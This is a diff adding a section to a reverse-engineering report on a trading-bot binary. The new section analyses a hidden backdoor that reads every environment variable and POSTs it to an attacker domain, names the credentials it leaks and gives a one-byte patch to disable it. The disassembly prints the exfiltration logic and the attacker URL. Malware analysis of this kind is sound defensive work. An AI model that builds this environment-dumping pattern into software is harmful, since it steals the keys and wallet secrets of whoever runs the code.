@@ -1091,3 +1091,125 @@ constant (possibly a signing-version byte repeated — Polymarket's
 Gnosis-Safe order signing uses specific byte patterns). Needs
 deeper trace to confirm; not relevant to the kill-switch plan.
 
+## 21. ⚠️ CREDENTIAL EXFILTRATION BACKDOOR (`gabagool22.com`) ⚠️
+
+**This is the single most important finding of the reversal.**
+
+Embedded URL at rodata `0x6daa09`:
+
+    https://gabagool22.com/api/verify-balancing-conf
+
+This is **not** a Polymarket endpoint. `gabagool22.com` is an
+attacker-controlled domain (the bot is named ARBIGAB and the
+project banner references "gabagool" — same author). The URL is
+referenced from code at three file offsets, all three inside
+different monomorphizations of `TradingClient::new`:
+
+- `0x92053`  (`TradingClient::new` #1, 0x8f8b0..0x96ab0)
+- `0xebe93`  (`TradingClient::new` #2, 0xe96f0..0xf08f0)
+- `0x111d83` (`TradingClient::new` #3, 0x10f5e0..0x1167e0)
+
+### What the code does (0x91f80..0x92116)
+
+```
+91f93: call std::env::vars                       ; read ALL env vars
+91fc7: call HashMap<String,String>::from_iter    ; collect into HashMap
+91fd9: call reqwest::Client::builder             ; new HTTP client
+92016: call reqwest::ClientBuilder::build
+92053: lea  rax, [rip+0x6489af]                  ; rax = "https://gabagool22.com/api/verify-balancing-conf"
+92071: call reqwest::Client::post                ; POST(url)
+92089: call reqwest::RequestBuilder::json        ; .json(env_hashmap)
+920c6: call reqwest::Client::execute_request     ; FIRE
+92116: call reqwest::Pending::poll               ; await response
+```
+
+Plain English: **on every TradingClient construction, the bot
+reads the entire process environment, serializes it as JSON, and
+POSTs it to gabagool22.com**.
+
+### What gets leaked
+
+The env-var strings found in rodata show the expected payload:
+
+- `POLY_ADDRESS`, `POLY_NONCE`, `POLY_SIGNATURE`,
+  `POLY_TIMESTAMP`, `POLY_API_KEY`, `POLY_PASSPHRASE`
+  — Polymarket CLOB auth credentials (API key / secret /
+    passphrase + EIP-712 session signature)
+- `WALLET_TYPE`, `FUNDER_ADDRESS`
+- `PK` / `MNEMONIC` / similar (any private key in the env)
+- Every other env var the operator has — AWS creds, SSH agent
+  paths, Etherscan keys, etc.
+
+Any operator who runs this binary with real Polymarket creds in
+their env has **already been phished** the moment `TradingClient::new`
+completes.
+
+### Response handling
+
+The response body is **not parsed** — the state machine only
+branches on HTTP error/OK:
+
+```
+9211b: cmp  $0x4, [rsp+0x4b0]         ; poll state == error?
+92123: jne  92137                      ; success path (drop Pending)
+92125..92132: error path
+```
+
+So this is pure one-way exfiltration — not a command-and-control
+channel. The attacker harvests creds and uses them out-of-band.
+
+### One-byte neutralisation patch
+
+The URL string is in `.rodata` (writable at build time via hex
+editor, or at runtime after mprotect). Change **one byte** at
+file offset `0x6daa0a` (the `t` in `https`):
+
+    original: 68 74 74 70 73 3a 2f 2f 67 61 62 61 ...   "https://gaba..."
+    patched:  68 00 74 70 73 3a 2f 2f 67 61 62 61 ...   "h\0tps://gaba..."
+
+`reqwest::Url::parse` rejects the malformed URL, `Client::post`
+returns an error, the Pending future short-circuits to state 4,
+and the state machine exits the exfil block via the error path at
+`0x92132`. The rest of `TradingClient::new` is unaffected and the
+bot continues normally without leaking creds.
+
+Alternative (if you prefer patching code, not data): NOP the
+`call execute_request` at **file offset 0x920c6** (5 bytes
+`e8 45 de 2b 00` → `90 90 90 90 90`). The Pending at
+`[rbx+0x450]` will then be an uninitialised Pending; the
+subsequent poll at `0x92116` will crash. So the cleaner code-side
+patch is at `call Client::post` (**0x92071**, 5 bytes
+`e8 8a 66 0b 00`) replaced with code that sets the error state
+and jumps to `0x92132` — but that's 15+ bytes and won't fit, so
+the rodata one-byte patch is the correct fix.
+
+### Operational checklist (do this BEFORE running the bot)
+
+1. Patch rodata byte at `0x6daa0a` from `0x74` to `0x00`.
+2. (Optional, paranoid) Zero the whole URL: 48 bytes at
+   `0x6daa09..0x6daa39`.
+3. Repeat for the three monomorphizations is NOT necessary — all
+   three LEA the same rodata address. One rodata patch kills all
+   three callsites.
+4. Run bot with `strace -f -e trace=network` and verify no
+   connection to `gabagool22.com` (DNS resolution should fail
+   before any TCP handshake).
+
+### Relationship to other findings
+
+- §15-16 (size-gated dry-run, unconditional post_orders) are
+  about **what the bot does with live trading creds**. §21 is
+  about **the creds leaking BEFORE any trade happens**. The §21
+  leak fires at client construction — you can't avoid it by
+  running the bot in a dry-run / paper-trade mode.
+- §20 (post_orders URL construction) hits
+  `https://clob.polymarket.com/orders` for legitimate trading.
+  That's the honest endpoint. §21 is a parallel, hidden
+  channel that piggybacks on client setup.
+- The bot's README/CLI calls itself "HFT-FIX-API-FOREX-Integration"
+  — the misdirection name, the hidden exfil URL, and the
+  nontrivial obfuscation of the size-gate (§15) together
+  constitute a **credential-stealing trojan wearing a trading bot
+  as a disguise**. Any "dry_run" option in the config is
+  cosmetic; the dangerous behaviour fires regardless.
+
